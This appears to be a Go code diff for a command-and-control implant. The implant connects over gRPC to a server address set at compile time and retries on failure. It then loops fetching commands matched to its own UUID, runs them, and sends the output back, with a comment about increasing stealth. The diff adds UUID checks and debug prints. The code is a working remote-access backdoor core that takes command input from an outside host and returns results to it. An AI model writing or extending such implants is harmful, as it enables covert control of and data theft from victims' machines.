@@ -33,6 +33,7 @@ var (
 	//build    string
 )
 
+// TODO: I think there error here is client-side, each implant needs to check if the commands UUID matches thier own, and then do something about it.
 func main() {
 	var (
 		opts   []grpc.DialOption
@@ -62,7 +63,7 @@ func main() {
 	//new version with compile injection
 	for i := 0; i < 10; i++ {
 		//attempt a connection
-		if conn, err = grpc.Dial(fmt.Sprintf("%s:%d", ip, port_num), opts...); err != nil {
+		if conn, err = grpc.Dial(fmt.Sprintf("%s:%d", ip, port_num), opts...); err != nil { //add timeout connectoin rules here
 			//sleep
 			time.Sleep(8 * time.Second)
 			//log.Fatal(err)
@@ -91,12 +92,17 @@ func main() {
 
 	//infinite loop to listen for commands
 	for {
-		var req = new(grpcapi.Empty)
-		cmd, err := client.FetchCommand(ctx, req) //make a call to the client, passing in a request context and an "Empty" struct.
+		var req = new(grpcapi.Registration)
+		req.Uuid = uuid
+		cmd, err := client.SendCommand(ctx, req) //make a call to the server, passing in a request context and an "Empty" struct.
 		if err != nil {
 			log.Fatal(err)
 		}
-		if cmd.In == "" {
+		//check if there is any commands and if the UUID is your own
+		if (cmd.In == "") || (cmd.Uuid != uuid) {
+			fmt.Println("[:] UUID comparison: ", cmd.Uuid == uuid)
+			fmt.Println("[+] compile-time uuid: ", uuid)
+			fmt.Println("[+] grpc uuid: ", cmd.Uuid)
 			//nothing to do, no input commands.
 			time.Sleep(3 * time.Second) //wait 3 seconds. could be more to increase stealth/decrease resource usage.
 			//debug printing
@@ -127,7 +133,8 @@ func main() {
 		}
 		//assign the commad the reconstituted tokenized input
 		cmd.Out += string(buffer)
-		//send to the client the
+		//send to the client
+		fmt.Println("[+] sent off my output!")
 		client.SendOutput(ctx, cmd) //when a command is issued, it sends the output back to the sender via contexts.
 	}
 }
